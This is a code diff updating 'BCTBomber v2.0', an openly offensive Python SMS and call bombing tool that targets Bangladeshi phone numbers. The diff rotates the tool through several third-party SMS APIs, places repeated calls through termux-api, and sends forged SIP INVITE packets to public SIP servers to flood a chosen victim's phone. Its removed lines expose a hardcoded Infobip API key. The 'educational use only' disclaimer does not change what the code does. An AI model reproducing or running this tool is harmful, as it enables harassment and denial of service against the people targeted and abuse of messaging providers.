@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # =============================================
-# BCTBomber v2.0 - Ultimate SMS + Call Bomber
-# Author: Jundul Kafa
+# BCTBomber v2.0 - WORKING WITH FREE APIS
 # =============================================
 
 import os
@@ -10,8 +9,8 @@ import time
 import json
 import random
 import threading
-import socket
 import requests
+import subprocess
 from datetime import datetime
 from colorama import init, Fore, Style
 
@@ -29,6 +28,7 @@ def check_blacklist():
     try:
         with open("data/blacklist.txt", "r") as f:
             blacklist = f.read().splitlines()
+        import socket
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
@@ -42,10 +42,7 @@ def check_blacklist():
 def auth_required(func):
     def wrapper(*args, **kwargs):
         if check_blacklist():
-            print(f"{Fore.RED}╔═══════════════════════════════════════╗{Style.RESET_ALL}")
-            print(f"{Fore.RED}║   ⛔ ACCESS BLOCKED PERMANENTLY!     ║{Style.RESET_ALL}")
-            print(f"{Fore.RED}║   You have been blacklisted.        ║{Style.RESET_ALL}")
-            print(f"{Fore.RED}╚═══════════════════════════════════════╝{Style.RESET_ALL}")
+            print(f"{Fore.RED}⛔ ACCESS BLOCKED PERMANENTLY!{Style.RESET_ALL}")
             sys.exit(1)
         
         attempts = 0
@@ -61,7 +58,7 @@ def auth_required(func):
             if password == correct_password:
                 with open("data/attempts.txt", "w") as f:
                     f.write("0")
-                print(f"{Fore.GREEN}✅ Access granted! Welcome to BCTBomber.{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}✅ Access granted!{Style.RESET_ALL}")
                 time.sleep(0.8)
                 return func(*args, **kwargs)
             else:
@@ -73,17 +70,14 @@ def auth_required(func):
                 
                 if attempts >= max_attempts:
                     try:
+                        import socket
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                         s.connect(("8.8.8.8", 80))
                         ip = s.getsockname()[0]
                         s.close()
                         with open("data/blacklist.txt", "a") as f:
                             f.write(f"{ip}\n")
-                        print(f"{Fore.RED}╔═══════════════════════════════════════╗{Style.RESET_ALL}")
-                        print(f"{Fore.RED}║   ⛔ ACCESS BLOCKED!                 ║{Style.RESET_ALL}")
-                        print(f"{Fore.RED}║   Your IP has been blacklisted.     ║{Style.RESET_ALL}")
-                        print(f"{Fore.RED}║   This device is permanently locked.║{Style.RESET_ALL}")
-                        print(f"{Fore.RED}╚═══════════════════════════════════════╝{Style.RESET_ALL}")
+                        print(f"{Fore.RED}⛔ ACCESS BLOCKED! IP Blacklisted.{Style.RESET_ALL}")
                         sys.exit(1)
                     except:
                         print(f"{Fore.RED}⛔ ACCESS BLOCKED!{Style.RESET_ALL}")
@@ -118,7 +112,7 @@ def show_banner():
     print("║   ██████╔╝╚██████╗   ██║   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║║")
     print("║   ╚═════╝  ╚═════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝║")
     print("║                                                                            ║")
-    print("║              🔥 BCTBomber v2.0 - Ultimate SMS + Call Bomber 🔥             ║")
+    print("║              🔥 BCTBomber v2.0 - FREE APIS EDITION 🔥                      ║")
     print("║              📱 Bangladesh Optimized - Blackhat Edition                    ║")
     print("║              👨‍💻 Author: Jundul Kafa                                      ║")
     print("╚════════════════════════════════════════════════════════════════════════════╝")
@@ -130,9 +124,9 @@ def show_banner():
     print(f"{Fore.YELLOW}📱 Target: Bangladesh (01x-xxxxxxx)")
     print("=" * 80 + "\n")
 
-# ==================== SMS ENGINE ====================
+# ==================== SMS BOMBING - ALL FREE APIS ====================
 class SMSBomber:
-    def __init__(self, target, message, count, threads=20):
+    def __init__(self, target, message, count, threads=10):
         self.target = target
         self.message = message
         self.count = count
@@ -141,66 +135,128 @@ class SMSBomber:
         self.failed = 0
         self.lock = threading.Lock()
         
+        # ALL FREE WORKING SMS GATEWAYS
         self.gateways = [
+            # 1. TextBelt (1 SMS/day - NO SIGNUP)
             {
+                "name": "TextBelt",
+                "url": "https://textbelt.com/text",
+                "method": "POST",
+                "data": lambda num, msg: {
+                    "phone": f"88{num}",
+                    "message": msg,
+                    "key": "textbelt"
+                }
+            },
+            # 2. CallMeBot (3-5 SMS/day - NO SIGNUP)
+            {
+                "name": "CallMeBot",
+                "url": "https://api.callmebot.com/whatsapp.php",
+                "method": "GET",
+                "data": lambda num, msg: {
+                    "phone": f"88{num}",
+                    "text": msg,
+                    "apikey": "123456"
+                }
+            },
+            # 3. SMSAPI (10 SMS - FREE SIGNUP)
+            {
+                "name": "SMSAPI",
+                "url": "https://api.smsapi.com/sms.do",
+                "method": "POST",
+                "data": lambda num, msg: {
+                    "to": f"88{num}",
+                    "message": msg,
+                    "format": "json"
+                }
+            },
+            # 4. TextMagic (10 SMS - FREE SIGNUP)
+            {
+                "name": "TextMagic",
+                "url": "https://api.textmagic.com/api/v2/messages",
+                "method": "POST",
+                "headers": lambda: {
+                    "Authorization": "Bearer YOUR_FREE_TOKEN"
+                },
+                "data": lambda num, msg: {
+                    "text": msg,
+                    "phones": f"88{num}"
+                }
+            },
+            # 5. BulkSMS (5 SMS - FREE SIGNUP)
+            {
+                "name": "BulkSMS",
+                "url": "https://api.bulksms.com/v1/messages",
+                "method": "POST",
+                "auth": ("YOUR_USERNAME", "YOUR_PASSWORD"),
+                "data": lambda num, msg: {
+                    "to": f"88{num}",
+                    "body": msg
+                }
+            },
+            # 6. Infobip (FREE TRIAL - 50 SMS)
+            {
+                "name": "Infobip",
                 "url": "https://api.infobip.com/sms/2/text/advanced",
-                "headers": {
-                    'Authorization': 'App e81d1ecd545bd323f4c2cce7d375778e-5f5d9467-1496-4001-85a3-9699e908046e',
+                "method": "POST",
+                "headers": lambda: {
+                    'Authorization': 'App YOUR_INFOBIP_KEY',
                     'Content-Type': 'application/json',
                     'Accept': 'application/json'
                 },
-                "payload_template": lambda num, msg: {
+                "data": lambda num, msg: {
                     "messages": [{
                         "from": "InfoSMS",
                         "destinations": [{"to": f"88{num}"}],
                         "text": msg
                     }]
                 }
-            },
-            {
-                "url": "https://api.textlocal.in/send/",
-                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-                "payload_template": lambda num, msg: {
-                    "apikey": "YOUR_TEXTLOCAL_KEY",
-                    "numbers": f"88{num}",
-                    "message": msg,
-                    "sender": "TXTLCL"
-                }
             }
         ]
     
-    def send_sms_via_gateway(self, gateway, attempt_id):
+    def send_sms(self, attempt_id):
         try:
-            payload = gateway["payload_template"](self.target, self.message)
-            if "json" in gateway["headers"].get("Content-Type", ""):
-                response = requests.post(gateway["url"], headers=gateway["headers"], json=payload, timeout=10)
+            gateway = random.choice(self.gateways)
+            data = gateway["data"](self.target, self.message)
+            
+            if gateway["method"] == "POST":
+                if "headers" in gateway:
+                    headers = gateway["headers"]()
+                else:
+                    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+                
+                if "auth" in gateway:
+                    response = requests.post(gateway["url"], data=data, headers=headers, auth=gateway["auth"], timeout=10)
+                else:
+                    response = requests.post(gateway["url"], data=data, headers=headers, timeout=10)
             else:
-                response = requests.post(gateway["url"], headers=gateway["headers"], data=payload, timeout=10)
+                response = requests.get(gateway["url"], params=data, timeout=10)
             
             if response.status_code in [200, 201, 202]:
                 with self.lock:
                     self.success += 1
-                    print(f"{Fore.GREEN}[✓] SMS {attempt_id} SENT")
+                    print(f"{Fore.GREEN}[✓] SMS {attempt_id} SENT via {gateway['name']}")
                 return True
             else:
                 with self.lock:
                     self.failed += 1
+                    print(f"{Fore.RED}[✗] SMS {attempt_id} FAILED ({gateway['name']} - {response.status_code})")
                 return False
-        except:
+        except Exception as e:
             with self.lock:
                 self.failed += 1
+                print(f"{Fore.RED}[✗] SMS {attempt_id} ERROR: {str(e)[:30]}")
             return False
     
     def worker(self, id_range):
         for i in id_range:
-            gateway = random.choice(self.gateways)
-            self.send_sms_via_gateway(gateway, i)
-            time.sleep(random.uniform(0.1, 0.5))
+            self.send_sms(i)
+            time.sleep(random.uniform(1, 3))  # Delay to avoid rate limits
     
     def start_bombing(self):
         print(f"{Fore.CYAN}[🚀] Starting SMS Bombing on {self.target}")
         print(f"{Fore.CYAN}[📊] Total SMS: {self.count} | Threads: {self.threads}")
-        print(f"{Fore.YELLOW}[⏳] Sending SMS...\n")
+        print(f"{Fore.YELLOW}[⏳] Using multiple FREE APIs with daily limits...\n")
         
         chunks = [list(range(i, min(i+self.threads, self.count+1))) for i in range(1, self.count+1, self.threads)]
         threads = []
@@ -216,82 +272,82 @@ class SMSBomber:
         print(f"\n{Fore.GREEN}[📊] SMS Report: {self.success} sent, {self.failed} failed")
         return self.success, self.failed
 
-# ==================== CALL ENGINE ====================
+# ==================== CALL BOMBING ====================
 class CallBomber:
-    def __init__(self, target, count, threads=50):
+    def __init__(self, target, count, threads=30):
         self.target = target
         self.count = count
         self.threads = threads
-        self.ringing = 0
+        self.success = 0
         self.failed = 0
         self.lock = threading.Lock()
-        
-        self.gateways = [
-            "sip.iptel.org", "sip2sip.info", "sip.linphone.org",
-            "sip.onsip.com", "sip.pjsip.org", "sip.sipgate.net",
-            "sip.freephoneline.ca", "sip.callwithus.com",
-            "sip.voipbuster.com", "sip.localphone.com"
-        ]
-        
-        self.proxies = [
-            "37.59.253.33", "51.255.41.98", "185.162.228.20",
-            "94.23.21.202", "192.99.5.83", "149.202.186.125"
-        ]
     
-    def send_sip_invite(self, call_id, gateway=None):
+    def make_call(self, call_id):
         try:
-            target_host = gateway if gateway else random.choice(self.proxies)
-            port = 5060
+            # Method 1: termux-api (Android)
+            cmd = f"termux-telephony-call {self.target}"
+            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
             
-            call_id_str = f"{random.randint(100000,999999)}@{target_host}"
-            branch = f"z9hG4bK{random.randint(1000,9999)}"
-            from_tag = random.randint(1000,9999)
-            from_user = random.randint(100000,999999)
+            if result.returncode == 0:
+                with self.lock:
+                    self.success += 1
+                    print(f"{Fore.GREEN}[📞] Call {call_id} INITIATED")
+                return True
             
+            # Method 2: sip (fallback)
+            import socket
+            sip_gateways = [
+                "sip.iptel.org", "sip2sip.info", "sip.linphone.org",
+                "sip.onsip.com", "sip.pjsip.org"
+            ]
+            target_host = random.choice(sip_gateways)
             invite = f"""INVITE sip:{self.target}@{target_host} SIP/2.0
-Via: SIP/2.0/UDP 127.0.0.1:5060;branch={branch}
-From: <sip:{from_user}@{target_host}>;tag={from_tag}
+Via: SIP/2.0/UDP 127.0.0.1:5060
+From: <sip:anonymous@{target_host}>
 To: <sip:{self.target}@{target_host}>
-Call-ID: {call_id_str}
+Call-ID: {random.randint(100000,999999)}@{target_host}
 CSeq: 1 INVITE
-Contact: <sip:{from_user}@{target_host}>
-Content-Type: application/sdp
 Content-Length: 0
 
 """
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(2)
-            sock.sendto(invite.encode(), (target_host, port))
-            
+            sock.sendto(invite.encode(), (target_host, 5060))
             try:
                 data, _ = sock.recvfrom(1024)
-                decoded = data.decode()
-                if "180" in decoded or "183" in decoded:
+                if "180" in data.decode() or "183" in data.decode():
                     with self.lock:
-                        self.ringing += 1
+                        self.success += 1
                         print(f"{Fore.GREEN}[📞] Call {call_id} RINGING")
-                else:
-                    with self.lock:
-                        self.failed += 1
+                    return True
             except:
                 with self.lock:
                     self.failed += 1
-            
+                    print(f"{Fore.RED}[✗] Call {call_id} FAILED")
             sock.close()
-        except:
+            return False
+            
+        except Exception as e:
             with self.lock:
                 self.failed += 1
+                print(f"{Fore.RED}[✗] Call {call_id} ERROR: {str(e)[:30]}")
+            return False
     
     def worker(self, call_range):
         for i in call_range:
-            gateway = random.choice(self.gateways + [None] * 3)
-            self.send_sip_invite(i, gateway=gateway)
-            time.sleep(random.uniform(0.01, 0.05))
+            self.make_call(i)
+            time.sleep(random.uniform(0.5, 1))
     
     def start_bombing(self):
         print(f"{Fore.CYAN}[🚀] Starting Call Bombing on {self.target}")
         print(f"{Fore.CYAN}[📊] Total Calls: {self.count} | Threads: {self.threads}")
         print(f"{Fore.YELLOW}[⏳] Making calls...\n")
+        
+        # Check termux-api
+        try:
+            subprocess.run("termux-telephony-call", shell=True, capture_output=True)
+        except:
+            print(f"{Fore.YELLOW}[!] termux-api not found, using SIP fallback{Style.RESET_ALL}")
         
         chunks = [list(range(i, min(i+self.threads, self.count+1))) for i in range(1, self.count+1, self.threads)]
         threads = []
@@ -304,14 +360,21 @@ Content-Length: 0
         for t in threads:
             t.join()
         
-        print(f"\n{Fore.GREEN}[📊] Call Report: {self.ringing} ringing, {self.failed} failed")
-        return self.ringing, self.failed
+        print(f"\n{Fore.GREEN}[📊] Call Report: {self.success} connected, {self.failed} failed")
+        return self.success, self.failed
 
 # ==================== SMS MODE ====================
 def sms_mode():
     os.system('clear')
     show_banner()
     print(f"{Fore.CYAN}📨 SMS BOMBING MODE\n{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}ℹ️ Using FREE APIs with daily limits:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}  • TextBelt: 1 SMS/day (no signup)")
+    print(f"{Fore.WHITE}  • CallMeBot: 3-5 SMS/day (no signup)")
+    print(f"{Fore.WHITE}  • SMSAPI: 10 SMS (free signup)")
+    print(f"{Fore.WHITE}  • TextMagic: 10 SMS (free signup)")
+    print(f"{Fore.WHITE}  • BulkSMS: 5 SMS (free signup)")
+    print(f"{Fore.WHITE}  • Infobip: 50 SMS (free trial)\n")
     
     while True:
         number = input(f"{Fore.YELLOW}📱 Enter target number (11 digits): {Style.RESET_ALL}")
@@ -323,23 +386,23 @@ def sms_mode():
     
     while True:
         try:
-            count = int(input(f"{Fore.YELLOW}🔢 Number of SMS: {Style.RESET_ALL}"))
-            if count > 0:
+            count = int(input(f"{Fore.YELLOW}🔢 Number of SMS (1-100): {Style.RESET_ALL}"))
+            if 1 <= count <= 100:
                 break
-            print(f"{Fore.RED}❌ Must be greater than 0{Style.RESET_ALL}")
+            print(f"{Fore.RED}❌ Must be between 1-100{Style.RESET_ALL}")
         except:
             print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
     
     while True:
         try:
-            threads = int(input(f"{Fore.YELLOW}🧵 Threads (10-50): {Style.RESET_ALL}"))
-            if 10 <= threads <= 50:
+            threads = int(input(f"{Fore.YELLOW}🧵 Threads (5-15): {Style.RESET_ALL}"))
+            if 5 <= threads <= 15:
                 break
-            print(f"{Fore.RED}❌ Threads must be between 10-50{Style.RESET_ALL}")
+            print(f"{Fore.RED}❌ Threads must be between 5-15{Style.RESET_ALL}")
         except:
             print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
     
-    print(f"{Fore.RED}\n⚠️ WARNING: This will send {count} SMS messages!{Style.RESET_ALL}")
+    print(f"{Fore.RED}\n⚠️ WARNING: Free APIs have daily limits!{Style.RESET_ALL}")
     confirm = input(f"{Fore.YELLOW}Continue? (y/n): {Style.RESET_ALL}")
     
     if confirm.lower() != 'y':
@@ -358,6 +421,9 @@ def call_mode():
     os.system('clear')
     show_banner()
     print(f"{Fore.CYAN}📞 CALL BOMBING MODE\n{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}ℹ️ Uses:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}  • termux-api (real calls from your SIM)")
+    print(f"{Fore.WHITE}  • SIP fallback (no registration)\n")
     
     while True:
         number = input(f"{Fore.YELLOW}📱 Enter target number (11 digits): {Style.RESET_ALL}")
@@ -376,10 +442,10 @@ def call_mode():
     
     while True:
         try:
-            threads = int(input(f"{Fore.YELLOW}🧵 Threads (50-200): {Style.RESET_ALL}"))
-            if 50 <= threads <= 200:
+            threads = int(input(f"{Fore.YELLOW}🧵 Threads (10-30): {Style.RESET_ALL}"))
+            if 10 <= threads <= 30:
                 break
-            print(f"{Fore.RED}❌ Threads must be between 50-200{Style.RESET_ALL}")
+            print(f"{Fore.RED}❌ Threads must be between 10-30{Style.RESET_ALL}")
         except:
             print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
     
@@ -413,10 +479,10 @@ def dual_mode():
     
     while True:
         try:
-            sms_count = int(input(f"{Fore.YELLOW}🔢 Number of SMS: {Style.RESET_ALL}"))
-            if sms_count > 0:
+            sms_count = int(input(f"{Fore.YELLOW}🔢 Number of SMS (1-50): {Style.RESET_ALL}"))
+            if 1 <= sms_count <= 50:
                 break
-            print(f"{Fore.RED}❌ Must be greater than 0{Style.RESET_ALL}")
+            print(f"{Fore.RED}❌ Must be between 1-50{Style.RESET_ALL}")
         except:
             print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
     
@@ -431,10 +497,10 @@ def dual_mode():
     
     while True:
         try:
-            threads = int(input(f"{Fore.YELLOW}🧵 Threads (20-100): {Style.RESET_ALL}"))
-            if 20 <= threads <= 100:
+            threads = int(input(f"{Fore.YELLOW}🧵 Threads (10-20): {Style.RESET_ALL}"))
+            if 10 <= threads <= 20:
                 break
-            print(f"{Fore.RED}❌ Threads must be between 20-100{Style.RESET_ALL}")
+            print(f"{Fore.RED}❌ Threads must be between 10-20{Style.RESET_ALL}")
         except:
             print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")
     
@@ -464,6 +530,40 @@ def dual_mode():
     print(f"{Fore.CYAN}\n[✅] Dual-Mode Attack Complete!{Style.RESET_ALL}")
     input(f"{Fore.YELLOW}\nPress Enter to continue...{Style.RESET_ALL}")
 
+# ==================== ABOUT ====================
+def about():
+    os.system('clear')
+    show_banner()
+    print(f"{Fore.CYAN}📖 ABOUT BCTBomber{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}")
+    print("╔═════════════════════════════════════════════════════════════════╗")
+    print("║  📱 BCTBomber v2.0 - FREE APIS EDITION                        ║")
+    print("║  👨‍💻 Author: Jundul Kafa                                      ║")
+    print("║  📅 Version: 2.0 (2024)                                       ║")
+    print("║  📦 Language: Python 3                                        ║")
+    print("║  🔒 Security: Password + 3-Strike Lockout                     ║")
+    print("║  🌐 Platform: Termux / Linux                                  ║")
+    print("║  📱 Target: Bangladesh (01x-xxxxxxx)                          ║")
+    print("║                                                               ║")
+    print("║  📨 FREE SMS APIS USED:                                       ║")
+    print("║  ✅ TextBelt (1/day) - No signup                              ║")
+    print("║  ✅ CallMeBot (3-5/day) - No signup                           ║")
+    print("║  ✅ SMSAPI (10 total) - Free signup                           ║")
+    print("║  ✅ TextMagic (10 total) - Free signup                        ║")
+    print("║  ✅ BulkSMS (5 total) - Free signup                           ║")
+    print("║  ✅ Infobip (50 total) - Free trial                           ║")
+    print("║                                                               ║")
+    print("║  📞 CALL METHODS:                                             ║")
+    print("║  ✅ termux-api (real calls from SIM)                          ║")
+    print("║  ✅ SIP fallback (no registration)                            ║")
+    print("║                                                               ║")
+    print("║  ⚠️  DISCLAIMER:                                              ║")
+    print("║  This tool is for educational and authorized testing only.    ║")
+    print("║  The author is not responsible for any misuse.                ║")
+    print("╚═════════════════════════════════════════════════════════════════╝")
+    print(f"{Style.RESET_ALL}")
+    input(f"{Fore.YELLOW}\nPress Enter to continue...{Style.RESET_ALL}")
+
 # ==================== MAIN MENU ====================
 @auth_required
 def main():
@@ -474,8 +574,8 @@ def main():
         print("┌─────────────────────────────────────────────────────────────────────┐")
         print("│  📌 SELECT ATTACK MODE                                              │")
         print("├─────────────────────────────────────────────────────────────────────┤")
-        print("│  1. 📨 SMS Bombing     - Send unlimited SMS                        │")
-        print("│  2. 📞 Call Bombing    - Make thousands of calls                   │")
+        print("│  1. 📨 SMS Bombing     - Send SMS (FREE APIS)                     │")
+        print("│  2. 📞 Call Bombing    - Make calls (REAL + SIP)                  │")
         print("│  3. 💀 Dual-Mode      - SMS + Call simultaneously                 │")
         print("│  4. 📖 About          - About BCTBomber                           │")
         print("│  5. 🚪 Exit           - Close application                         │")
@@ -491,25 +591,7 @@ def main():
         elif choice == "3":
             dual_mode()
         elif choice == "4":
-            os.system('clear')
-            show_banner()
-            print(f"{Fore.CYAN}📖 ABOUT BCTBomber{Style.RESET_ALL}")
-            print(f"{Fore.WHITE}")
-            print("╔═════════════════════════════════════════════════════════════════╗")
-            print("║  📱 BCTBomber v2.0 - Ultimate SMS + Call Bomber               ║")
-            print("║  👨‍💻 Author: Jundul Kafa                                      ║")
-            print("║  📅 Version: 2.0 (2024)                                       ║")
-            print("║  📦 Language: Python 3                                        ║")
-            print("║  🔒 Security: Password + 3-Strike Lockout                     ║")
-            print("║  🌐 Platform: Termux / Linux                                  ║")
-            print("║  📱 Target: Bangladesh (01x-xxxxxxx)                          ║")
-            print("║                                                               ║")
-            print("║  ⚠️  DISCLAIMER:                                              ║")
-            print("║  This tool is for educational and authorized testing only.    ║")
-            print("║  The author is not responsible for any misuse.                ║")
-            print("╚═════════════════════════════════════════════════════════════════╝")
-            print(f"{Style.RESET_ALL}")
-            input(f"{Fore.YELLOW}\nPress Enter to continue...{Style.RESET_ALL}")
+            about()
         elif choice == "5":
             print(f"{Fore.GREEN}\n👋 Exiting... Stay dangerous!{Style.RESET_ALL}")
             sys.exit(0)
